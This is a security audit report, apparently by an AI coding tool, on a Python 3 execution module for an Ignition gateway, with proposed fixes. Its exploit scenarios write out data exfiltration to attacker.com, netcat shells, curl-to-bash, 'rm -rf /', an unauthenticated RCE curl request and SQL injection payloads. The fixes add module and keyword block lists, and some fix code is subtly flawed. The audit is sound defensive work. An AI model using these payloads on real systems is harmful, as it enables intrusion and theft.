# Python 3 Integration Module - Security Audit Report

**Audit Date:** 2025-10-17
**Module Version:** v1.13.0
**Auditor:** Claude Code
**Severity Classification:** OWASP Risk Rating

---

## Executive Summary

This security audit reveals **3 critical vulnerabilities** that must be addressed before production deployment. The module provides powerful Python code execution capabilities, which inherently carries significant security risks. While basic functionality works well, the current implementation is **suitable only for trusted development environments**.

**Security Posture:** ⚠️ **NOT PRODUCTION-READY** without immediate fixes

**Risk Level by Category:**
- **Code Injection:** 🔴 CRITICAL - Arbitrary code execution
- **Authentication:** 🔴 CRITICAL - No endpoint authentication
- **SQL Injection:** 🔴 CRITICAL - Database compromise
- **Input Validation:** 🟡 HIGH - DoS vectors
- **Information Disclosure:** 🟡 MEDIUM - Excessive error details
- **Network Security:** 🟢 LOW - HTTPS recommended but not critical

---

## 🔴 Critical Vulnerabilities

### CVE-PYTHON3-001: Unrestricted Python Code Execution

**Severity:** CRITICAL (CVSS 9.8)
**Category:** Code Injection (CWE-94)
**Affected Files:**
- `python3-integration/gateway/src/main/java/com/inductiveautomation/ignition/examples/python3/gateway/Python3Executor.java`
- `python3-integration/gateway/src/main/resources/python_bridge.py`

**Vulnerability Description:**

The module executes arbitrary Python code in a subprocess without any sandboxing or restrictions. Users can import and use ANY Python module, including:
- `os` - Operating system access (file operations, process spawning)
- `subprocess` - Shell command execution
- `socket` - Network operations
- `sys` - Python interpreter manipulation
- `__import__` - Dynamic module imports

**Exploit Scenario:**

```python
# Attacker submits this code via REST API or Designer IDE:

# 1. Read sensitive files
import os
gateway_config = open('/opt/ignition/data/gateway.xml', 'r').read()

# 2. Exfiltrate data
import urllib.request
urllib.request.urlopen('http://attacker.com/steal?data=' + gateway_config)

# 3. Establish persistent backdoor
import subprocess
subprocess.Popen(['bash', '-c', 'nc -l 4444 -e /bin/sh &'])

# 4. Crypto mining
import subprocess
subprocess.Popen(['curl', 'http://attacker.com/miner.sh', '|', 'bash'])

# 5. Lateral movement
import paramiko
ssh = paramiko.SSHClient()
ssh.connect('internal-server', username='admin', password='password')
ssh.exec_command('rm -rf /')
```

**Impact:**
- Complete Gateway server compromise
- Arbitrary file read/write/delete
- Network access for data exfiltration
- Persistent backdoor installation
- Lateral movement to internal network
- Denial of service
- Resource hijacking (crypto mining)

**Proof of Concept:**

```bash
# Remote code execution via REST API (no auth required!)
curl -X POST http://gateway:8088/data/python3integration/api/v1/exec \
  -H "Content-Type: application/json" \
  -d '{
    "code": "import os; os.system(\"whoami > /tmp/pwned.txt\")"
  }'
```

**Recommended Fix (Priority 1):**

**Step 1: Implement RestrictedPython**

```bash
# Install RestrictedPython in Gateway Python environment
pip install RestrictedPython
```

```python
# python_bridge.py - SECURE VERSION
from RestrictedPython import compile_restricted, safe_globals, limited_builtins, safe_iter
from RestrictedPython.Eval import default_guarded_getitem, default_guarded_getiter
from RestrictedPython.Guards import guarded_iter_unpack_sequence

class SecurePythonExecutor:
    def __init__(self):
        # Define safe modules whitelist
        self.safe_modules = {
            'math': __import__('math'),
            'json': __import__('json'),
            'datetime': __import__('datetime'),
            'itertools': __import__('itertools'),
            'collections': __import__('collections'),
            'decimal': __import__('decimal'),
            'random': __import__('random'),
            're': __import__('re'),
            # Pandas/NumPy if data science needed (with caution)
            # 'pandas': __import__('pandas'),
            # 'numpy': __import__('numpy'),
        }

        # BLOCKED modules (never allow)
        self.blocked_modules = {
            'os', 'subprocess', 'sys', 'socket', 'urllib', 'requests',
            'http', 'ftplib', 'smtplib', 'telnetlib', 'paramiko',
            '__import__', 'eval', 'exec', 'compile', 'open',
            'input', 'raw_input', 'file', 'execfile'
        }

    def safe_import(self, name, *args, **kwargs):
        """Restricted import function"""
        if name in self.blocked_modules:
            raise ImportError(f"Module '{name}' is not allowed for security reasons")

        if name not in self.safe_modules:
            raise ImportError(f"Module '{name}' is not in the approved whitelist")

        return self.safe_modules[name]

    def execute(self, code: str, variables: dict) -> dict:
        """Execute Python code in restricted environment"""
        try:
            # Compile with RestrictedPython
            byte_code = compile_restricted(
                code,
                '<user_code>',
                'exec',
                policy=RestrictedPython.PrintCollector
            )

            if byte_code.errors:
                return {
                    'success': False,
                    'error': 'Security policy violation: ' + ', '.join(byte_code.errors)
                }

            # Create restricted globals
            restricted_globals = {
                '__builtins__': {
                    **limited_builtins,
                    '_import_': self.safe_import,
                    '_getitem_': default_guarded_getitem,
                    '_getiter_': default_guarded_getiter,
                    '_iter_unpack_sequence_': guarded_iter_unpack_sequence,
                    '__name__': 'restricted_module',
                    '__metaclass__': type,
                },
                **self.safe_modules,
                **variables
            }

            # Create restricted locals
            restricted_locals = {}

            # Execute
            exec(byte_code.code, restricted_globals, restricted_locals)

            # Collect results
            result = restricted_locals.get('result', None)

            return {
                'success': True,
                'result': result
            }

        except Exception as e:
            return {
                'success': False,
                'error': f'{type(e).__name__}: {str(e)}',
                'traceback': traceback.format_exc()
            }
```

**Step 2: Add Module Blacklist Check**

```java
// Python3Executor.java - Add validation
public Python3Result execute(String code, Map<String, Object> variables) throws Python3Exception {
    // Validate code doesn't contain dangerous imports
    validateCodeSecurity(code);

    // ... existing execution logic
}

private void validateCodeSecurity(String code) throws Python3Exception {
    String[] dangerousImports = {
        "import os", "from os import",
        "import subprocess", "from subprocess import",
        "import sys", "from sys import",
        "import socket", "from socket import",
        "__import__"
    };

    for (String dangerous : dangerousImports) {
        if (code.contains(dangerous)) {
            throw new Python3Exception(
                "Security violation: Import of '" + dangerous + "' is not allowed. " +
                "Allowed modules: math, json, datetime, itertools, collections, decimal, random, re"
            );
        }
    }

    // Check for dangerous functions
    String[] dangerousFunctions = {
        "eval(", "exec(", "compile(", "open(", "__import__("
    };

    for (String dangerous : dangerousFunctions) {
        if (code.contains(dangerous)) {
            throw new Python3Exception(
                "Security violation: Function '" + dangerous + "' is not allowed"
            );
        }
    }
}
```

**Step 3: Add Configuration Option**

```properties
# Gateway configuration (ignition.conf or system properties)
python3.security.mode=RESTRICTED  # RESTRICTED, TRUSTED, SANDBOX

# RESTRICTED: RestrictedPython with whitelist (default, secure)
# TRUSTED: No restrictions (for trusted environments only)
# SANDBOX: Docker container isolation (future)

python3.security.allowed.modules=math,json,datetime,itertools,collections
python3.security.max.execution.time.seconds=60
python3.security.max.memory.mb=512
```

**Testing:**

```python
# Should FAIL with security error
import os
os.system("whoami")

# Should FAIL
import subprocess
subprocess.call(["ls", "-la"])

# Should SUCCEED
import math
result = math.sqrt(16)
print(result)  # 4.0
```

**Timeline:** Implement in v1.14.0 (2-3 weeks)

---

### CVE-PYTHON3-002: Missing Authentication on REST Endpoints

**Severity:** CRITICAL (CVSS 10.0)
**Category:** Missing Authentication (CWE-306)
**Affected Files:**
- `python3-integration/gateway/src/main/java/com/inductiveautomation/ignition/examples/python3/gateway/Python3RestEndpoints.java`

**Vulnerability Description:**

All REST API endpoints use `RouteAccess.GRANTED`, allowing unauthenticated access from any source. Combined with CVE-PYTHON3-001, this enables remote unauthenticated code execution.

**Affected Endpoints:**
```
POST /data/python3integration/api/v1/exec              [UNAUTHENTICATED]
POST /data/python3integration/api/v1/eval              [UNAUTHENTICATED]
POST /data/python3integration/api/v1/call-module       [UNAUTHENTICATED]
POST /data/python3integration/api/v1/check-syntax      [UNAUTHENTICATED]
POST /data/python3integration/api/v1/completions       [UNAUTHENTICATED]
GET  /data/python3integration/api/v1/diagnostics       [UNAUTHENTICATED]
GET  /data/python3integration/api/v1/pool-stats        [UNAUTHENTICATED]
GET  /data/python3integration/api/v1/version           [UNAUTHENTICATED]
```

**Exploit Scenario:**

```bash
# Attacker from internet (no credentials needed)
curl -X POST http://public-gateway.company.com:8088/data/python3integration/api/v1/exec \
  -H "Content-Type: application/json" \
  -d '{
    "code": "import urllib.request; urllib.request.urlopen(\"http://attacker.com/steal?data=\" + open(\"/opt/ignition/data/db.properties\").read())"
  }'

# Database credentials exfiltrated
# Gateway compromised
# No authentication required
# No rate limiting
# No audit trail
```

**Impact:**
- Remote unauthenticated code execution (RCE)
- Data breach (database credentials, configuration)
- Complete Gateway compromise
- No accountability (no user attribution)
- Botnet attacks (automated exploitation)

**Recommended Fix (Priority 1):**

```java
// Python3RestEndpoints.java - SECURE VERSION

public class Python3RestEndpoints {
    private static final Logger LOGGER = LoggerFactory.getLogger(Python3RestEndpoints.class);

    /**
     * Check if user has permission to execute Python code
     */
    private static RouteAccess checkExecutePermission(RequestContext req) {
        try {
            // Get authenticated user
            User user = req.getUser();

            // Require authentication
            if (user == null) {
                LOGGER.warn("Unauthenticated Python execution attempt from IP: {}",
                    req.getRemoteAddr());
                return RouteAccess.DENIED("Authentication required");
            }

            // Check specific permission
            SecurityContext securityContext = req.getGatewayContext().getSecurityManager().getSecurityContext();

            // Option 1: Check role
            if (!user.getRoles().contains("Python3Admin") &&
                !user.getRoles().contains("Administrator")) {

                LOGGER.warn("User {} attempted Python execution without Python3Admin role",
                    user.getUsername());

                return RouteAccess.DENIED(
                    "Insufficient permissions. Required role: Python3Admin"
                );
            }

            // Option 2: Check custom permission (better)
            if (!securityContext.hasPermission("python3.execute")) {
                LOGGER.warn("User {} lacks python3.execute permission",
                    user.getUsername());

                return RouteAccess.DENIED(
                    "Insufficient permissions. Required: python3.execute"
                );
            }

            // Grant access
            return RouteAccess.GRANTED;

        } catch (Exception e) {
            LOGGER.error("Error checking Python execution permission", e);
            return RouteAccess.DENIED("Permission check failed");
        }
    }

    /**
     * Check read-only permission (diagnostics, stats)
     */
    private static RouteAccess checkReadPermission(RequestContext req) {
        User user = req.getUser();

        if (user == null) {
            return RouteAccess.DENIED("Authentication required");
        }

        // Allow authenticated users to view diagnostics
        return RouteAccess.GRANTED;
    }

    public static void mountRoutes(RouteGroup routes, Python3ScriptModule scriptModule) {
        // CODE EXECUTION endpoints - Strict auth
        routes.newRoute("/api/v1/exec")
            .handler(req -> handleExec(req, scriptModule))
            .method(HttpMethod.POST)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkExecutePermission)  // ✅ AUTH
            .mount();

        routes.newRoute("/api/v1/eval")
            .handler(req -> handleEval(req, scriptModule))
            .method(HttpMethod.POST)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkExecutePermission)  // ✅ AUTH
            .mount();

        routes.newRoute("/api/v1/call-module")
            .handler(req -> handleCallModule(req, scriptModule))
            .method(HttpMethod.POST)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkExecutePermission)  // ✅ AUTH
            .mount();

        routes.newRoute("/api/v1/check-syntax")
            .handler(req -> handleCheckSyntax(req, scriptModule))
            .method(HttpMethod.POST)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkExecutePermission)  // ✅ AUTH
            .mount();

        routes.newRoute("/api/v1/completions")
            .handler(req -> handleGetCompletions(req, scriptModule))
            .method(HttpMethod.POST)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkExecutePermission)  // ✅ AUTH
            .mount();

        // READ endpoints - Basic auth
        routes.newRoute("/api/v1/diagnostics")
            .handler(req -> handleDiagnostics(req, scriptModule))
            .method(HttpMethod.GET)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkReadPermission)  // ✅ AUTH
            .mount();

        routes.newRoute("/api/v1/pool-stats")
            .handler(req -> handlePoolStats(req, scriptModule))
            .method(HttpMethod.GET)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkReadPermission)  // ✅ AUTH
            .mount();

        routes.newRoute("/api/v1/version")
            .handler(Python3RestEndpoints::handleGetVersion)
            .method(HttpMethod.GET)
            .type(RouteGroup.TYPE_JSON)
            .accessControl(Python3RestEndpoints::checkReadPermission)  // ✅ AUTH
            .mount();
    }

    /**
     * Enhanced exec handler with audit logging
     */
    private static JsonObject handleExec(RequestContext req, Python3ScriptModule scriptModule) {
        User user = req.getUser();  // Guaranteed non-null due to accessControl

        try {
            JsonObject requestBody = parseJsonBody(req);
            String code = requestBody.has("code") ? requestBody.get("code").getAsString() : "";

            // Audit log BEFORE execution
            LOGGER.info("Python code execution by user: {} | IP: {} | Code length: {} bytes",
                user.getUsername(),
                req.getRemoteAddr(),
                code.length());

            // Log to audit table for compliance
            auditPythonExecution(user, code, req.getRemoteAddr());

            // Execute (with security checks)
            Map<String, Object> variables = extractVariables(requestBody);
            Map<String, Object> result = scriptModule.exec(code, variables);

            // Success response
            JsonObject response = new JsonObject();
            response.addProperty("success", true);
            response.add("result", GSON.toJsonTree(result.get("result")));

            LOGGER.info("Python execution completed successfully for user: {}", user.getUsername());

            return response;

        } catch (Exception e) {
            LOGGER.error("Python execution failed for user: " + user.getUsername(), e);

            // Audit failure
            auditPythonExecutionFailure(user, e.getMessage(), req.getRemoteAddr());

            return createErrorResponse("Execution failed: " + e.getMessage());
        }
    }

    /**
     * Audit log Python execution to database
     */
    private static void auditPythonExecution(User user, String code, String ipAddress) {
        try {
            String sql = "INSERT INTO python3_audit_log (username, timestamp, action, code_hash, ip_address) VALUES (?, ?, ?, ?, ?)";

            // Hash code for audit (don't store full code - may contain secrets)
            String codeHash = hashCode(code);

            // Execute insert
            // database.execute(sql, user.getUsername(), System.currentTimeMillis(), "EXECUTE", codeHash, ipAddress);

        } catch (Exception e) {
            LOGGER.error("Failed to write audit log", e);
        }
    }
}
```

**Additional Security:**

**Rate Limiting:**
```java
public class RateLimiter {
    private final LoadingCache<String, AtomicInteger> requestCounts;

    public RateLimiter() {
        this.requestCounts = CacheBuilder.newBuilder()
            .expireAfterWrite(1, TimeUnit.MINUTES)
            .build(new CacheLoader<String, AtomicInteger>() {
                @Override
                public AtomicInteger load(String key) {
                    return new AtomicInteger(0);
                }
            });
    }

    public boolean allowRequest(String userId) {
        try {
            AtomicInteger count = requestCounts.get(userId);
            int currentCount = count.incrementAndGet();

            if (currentCount > 100) {  // 100 requests per minute
                LOGGER.warn("Rate limit exceeded for user: {}", userId);
                return false;
            }

            return true;
        } catch (ExecutionException e) {
            return false;
        }
    }
}

// In endpoint handler:
if (!rateLimiter.allowRequest(user.getUsername())) {
    return createErrorResponse("Rate limit exceeded. Maximum 100 requests per minute.");
}
```

**IP Whitelist (Optional):**
```properties
# Only allow from internal network
python3.security.allowed.ips=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16
```

**Timeline:** Implement in v1.14.0 (1 week)

---

### CVE-PYTHON3-003: SQL Injection in Script Repository

**Severity:** CRITICAL (CVSS 9.1)
**Category:** SQL Injection (CWE-89)
**Affected Files:**
- `python3-integration/gateway/src/main/java/com/inductiveautomation/ignition/examples/python3/gateway/Python3ScriptRepository.java`

**Vulnerability Description:**

Multiple SQL queries use string concatenation instead of parameterized statements, enabling SQL injection attacks.

**Vulnerable Code Locations:**

```java
// Line 175 - VULNERABLE
public SavedScript loadScript(String name) {
    String query = "SELECT * FROM python3_scripts WHERE name = '" + name + "'";
    // ❌ SQL INJECTION
}

// Line 258 - VULNERABLE
public List<ScriptMetadata> listScriptsByFolder(String folderPath) {
    String query = "SELECT * FROM python3_scripts WHERE folder_path = '" + folderPath + "'";
    // ❌ SQL INJECTION
}

// Line 316 - VULNERABLE
public void saveScript(String name, String code, ...) {
    String query = "INSERT INTO python3_scripts (name, code, ...) VALUES ('" + name + "', '" + code + "', ...)";
    // ❌ SQL INJECTION
}
```

**Exploit Scenarios:**

**Scenario 1: Authentication Bypass**
```java
// Attacker provides script name:
String maliciousName = "test' OR '1'='1' --";

// Results in query:
SELECT * FROM python3_scripts WHERE name = 'test' OR '1'='1' --'

// Returns ALL scripts, bypassing ownership checks
```

**Scenario 2: Data Exfiltration**
```java
// UNION-based injection
String maliciousName = "test' UNION SELECT username, password, email, '', '', '', '', '' FROM gateway_users --";

// Exfiltrates all user accounts
```

**Scenario 3: Database Destruction**
```java
// Stacked queries (if supported by driver)
String maliciousName = "test'; DROP TABLE python3_scripts; --";

// Destroys all saved scripts
```

**Scenario 4: Backdoor Injection**
```java
// Modify existing scripts
String maliciousFolder = "'; UPDATE python3_scripts SET code = 'import os; os.system(\"nc -e /bin/sh attacker.com 4444\")' WHERE name = 'admin_script'; --";

// Injects backdoor into admin script
```

**Impact:**
- Unauthorized access to all scripts
- Data exfiltration (scripts, user data)
- Database corruption/destruction
- Backdoor injection into scripts
- Privilege escalation
- Bypass of access controls

**Recommended Fix (Priority 1):**

```java
// Python3ScriptRepository.java - SECURE VERSION

public class Python3ScriptRepository {
    private final PersistenceInterface database;
    private static final Logger LOGGER = LoggerFactory.getLogger(Python3ScriptRepository.class);

    /**
     * Load a script by name - SECURE VERSION
     */
    public SavedScript loadScript(String name) throws Exception {
        // Validate input
        validateScriptName(name);

        // Use parameterized query
        String query = "SELECT id, name, code, description, author, created_date, last_modified, folder_path, version " +
                       "FROM python3_scripts WHERE name = ?";

        try (PreparedStatement stmt = database.getConnection().prepareStatement(query)) {
            stmt.setString(1, name);  // ✅ Safe parameterization

            ResultSet rs = stmt.executeQuery();

            if (rs.next()) {
                SavedScript script = new SavedScript();
                script.setId(rs.getLong("id"));
                script.setName(rs.getString("name"));
                script.setCode(rs.getString("code"));
                script.setDescription(rs.getString("description"));
                script.setAuthor(rs.getString("author"));
                script.setCreatedDate(rs.getLong("created_date"));
                script.setLastModified(rs.getLong("last_modified"));
                script.setFolderPath(rs.getString("folder_path"));
                script.setVersion(rs.getString("version"));
                return script;
            }

            throw new ScriptNotFoundException("Script not found: " + name);
        }
    }

    /**
     * List scripts by folder - SECURE VERSION
     */
    public List<ScriptMetadata> listScriptsByFolder(String folderPath) throws Exception {
        // Validate input
        if (folderPath != null) {
            validateFolderPath(folderPath);
        }

        String query = "SELECT id, name, description, author, created_date, last_modified, folder_path, version " +
                       "FROM python3_scripts WHERE folder_path = ? ORDER BY name";

        List<ScriptMetadata> scripts = new ArrayList<>();

        try (PreparedStatement stmt = database.getConnection().prepareStatement(query)) {
            stmt.setString(1, folderPath);  // ✅ Safe parameterization

            ResultSet rs = stmt.executeQuery();

            while (rs.next()) {
                ScriptMetadata metadata = new ScriptMetadata();
                metadata.setId(rs.getLong("id"));
                metadata.setName(rs.getString("name"));
                metadata.setDescription(rs.getString("description"));
                metadata.setAuthor(rs.getString("author"));
                metadata.setCreatedDate(rs.getLong("created_date"));
                metadata.setLastModified(rs.getLong("last_modified"));
                metadata.setFolderPath(rs.getString("folder_path"));
                metadata.setVersion(rs.getString("version"));
                scripts.add(metadata);
            }

            return scripts;
        }
    }

    /**
     * Save script - SECURE VERSION
     */
    public void saveScript(String name, String code, String description, String author,
                          String folderPath, String version) throws Exception {
        // Validate ALL inputs
        validateScriptName(name);
        validateCode(code);
        validateFolderPath(folderPath);
        validateVersion(version);

        // Check if exists
        boolean exists = scriptExists(name);

        if (exists) {
            // Update existing
            String query = "UPDATE python3_scripts SET code = ?, description = ?, author = ?, " +
                          "last_modified = ?, folder_path = ?, version = ? WHERE name = ?";

            try (PreparedStatement stmt = database.getConnection().prepareStatement(query)) {
                stmt.setString(1, code);
                stmt.setString(2, description);
                stmt.setString(3, author);
                stmt.setLong(4, System.currentTimeMillis());
                stmt.setString(5, folderPath);
                stmt.setString(6, version);
                stmt.setString(7, name);

                stmt.executeUpdate();
            }
        } else {
            // Insert new
            String query = "INSERT INTO python3_scripts (name, code, description, author, created_date, last_modified, folder_path, version) " +
                          "VALUES (?, ?, ?, ?, ?, ?, ?, ?)";

            try (PreparedStatement stmt = database.getConnection().prepareStatement(query)) {
                long now = System.currentTimeMillis();
                stmt.setString(1, name);
                stmt.setString(2, code);
                stmt.setString(3, description);
                stmt.setString(4, author);
                stmt.setLong(5, now);
                stmt.setLong(6, now);
                stmt.setString(7, folderPath);
                stmt.setString(8, version);

                stmt.executeUpdate();
            }
        }

        LOGGER.info("Script saved: {} by {}", name, author);
    }

    /**
     * Delete script - SECURE VERSION
     */
    public void deleteScript(String name) throws Exception {
        validateScriptName(name);

        String query = "DELETE FROM python3_scripts WHERE name = ?";

        try (PreparedStatement stmt = database.getConnection().prepareStatement(query)) {
            stmt.setString(1, name);

            int deleted = stmt.executeUpdate();

            if (deleted == 0) {
                throw new ScriptNotFoundException("Script not found: " + name);
            }

            LOGGER.info("Script deleted: {}", name);
        }
    }

    /**
     * Validate script name
     */
    private void validateScriptName(String name) {
        if (name == null || name.trim().isEmpty()) {
            throw new IllegalArgumentException("Script name cannot be empty");
        }

        if (name.length() > 255) {
            throw new IllegalArgumentException("Script name too long (max 255 characters)");
        }

        // Allow alphanumeric, underscore, hyphen, period
        if (!name.matches("^[a-zA-Z0-9_.-]+$")) {
            throw new SecurityException("Script name contains invalid characters. Allowed: a-z, A-Z, 0-9, _, -, .");
        }

        // Blacklist SQL keywords
        String upperName = name.toUpperCase();
        String[] sqlKeywords = {"SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "UNION", "OR", "AND", "--", ";", "'", "\""};
        for (String keyword : sqlKeywords) {
            if (upperName.contains(keyword)) {
                throw new SecurityException("Script name contains SQL keyword: " + keyword);
            }
        }
    }

    /**
     * Validate code
     */
    private void validateCode(String code) {
        if (code == null) {
            throw new IllegalArgumentException("Code cannot be null");
        }

        if (code.length() > 1_048_576) {  // 1MB
            throw new IllegalArgumentException("Code size exceeds 1MB limit");
        }
    }

    /**
     * Validate folder path
     */
    private void validateFolderPath(String folderPath) {
        if (folderPath == null) {
            return;  // null is valid (root folder)
        }

        if (folderPath.length() > 1000) {
            throw new IllegalArgumentException("Folder path too long");
        }

        // Allow alphanumeric, underscore, hyphen, period, forward slash
        if (!folderPath.matches("^[a-zA-Z0-9_./\\-]*$")) {
            throw new SecurityException("Folder path contains invalid characters");
        }

        // No SQL keywords
        String upperPath = folderPath.toUpperCase();
        if (upperPath.contains("SELECT") || upperPath.contains("DROP") || upperPath.contains("--")) {
            throw new SecurityException("Folder path contains SQL keywords");
        }
    }
}
```

**Database Schema Fix:**

```sql
-- Add unique constraint to prevent duplicates
ALTER TABLE python3_scripts ADD CONSTRAINT unique_script_name UNIQUE (name);

-- Add indexes for performance
CREATE INDEX idx_folder_path ON python3_scripts(folder_path);
CREATE INDEX idx_author ON python3_scripts(author);
CREATE INDEX idx_last_modified ON python3_scripts(last_modified);

-- Add check constraints
ALTER TABLE python3_scripts ADD CONSTRAINT check_name_length CHECK (LENGTH(name) <= 255);
ALTER TABLE python3_scripts ADD CONSTRAINT check_code_length CHECK (LENGTH(code) <= 1048576);
```

**Testing:**

```java
// Test SQL injection defense
@Test
public void testSQLInjectionPrevention() {
    // Should fail validation
    assertThrows(SecurityException.class, () -> {
        repository.loadScript("test' OR '1'='1' --");
    });

    // Should fail validation
    assertThrows(SecurityException.class, () -> {
        repository.loadScript("test'; DROP TABLE python3_scripts; --");
    });

    // Should succeed
    SavedScript script = repository.loadScript("valid_script_name");
    assertNotNull(script);
}
```

**Timeline:** Implement in v1.14.0 (1 week)

---

## Additional Security Recommendations

### Deployment Hardening Checklist

```bash
# 1. HTTPS Only
ignition.conf:
wrapper.java.additional.X=-Dserver.ssl.enabled=true
wrapper.java.additional.X=-Dserver.require-ssl=true

# 2. Firewall Rules
iptables -A INPUT -p tcp --dport 8088 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 8088 -j DROP

# 3. Gateway User Permissions
# Create dedicated role: Python3Admin
# Assign only to trusted users

# 4. Audit Logging
# Enable Gateway audit logs
# Monitor for suspicious activity:
#   - Multiple failed login attempts
#   - Code execution from unexpected IPs
#   - Large code submissions
#   - Rapid execution requests

# 5. Resource Limits
python3.execution.max.time.seconds=60
python3.execution.max.memory.mb=512
python3.pool.size=3

# 6. Module Whitelist
python3.security.allowed.modules=math,json,datetime,itertools,collections,decimal,random,re

# 7. Regular Security Updates
pip install --upgrade RestrictedPython
pip install --upgrade jedi
```

---

## Security Testing Recommendations

1. **Static Analysis:**
   - Run SpotBugs / FindBugs
   - OWASP Dependency Check
   - SonarQube analysis

2. **Dynamic Analysis:**
   - OWASP ZAP automated scan
   - Burp Suite manual testing
   - SQL injection fuzzing

3. **Penetration Testing:**
   - Code injection attempts
   - Authentication bypass
   - SQL injection
   - XSS testing
   - DoS testing

4. **Compliance:**
   - OWASP Top 10 review
   - CWE/SANS Top 25 review
   - PCI-DSS (if applicable)
   - GDPR data protection

---

## Conclusion

This module provides powerful Python execution capabilities but requires **immediate security hardening** before production deployment. The three critical vulnerabilities (arbitrary code execution, missing authentication, SQL injection) must be addressed in v1.14.0.

**Recommended Action Plan:**
1. **Week 1:** Fix authentication + SQL injection
2. **Week 2:** Implement RestrictedPython sandboxing
3. **Week 3:** Testing + deployment

**Security Certification:** ⏳ PENDING (after v1.14.0 fixes)
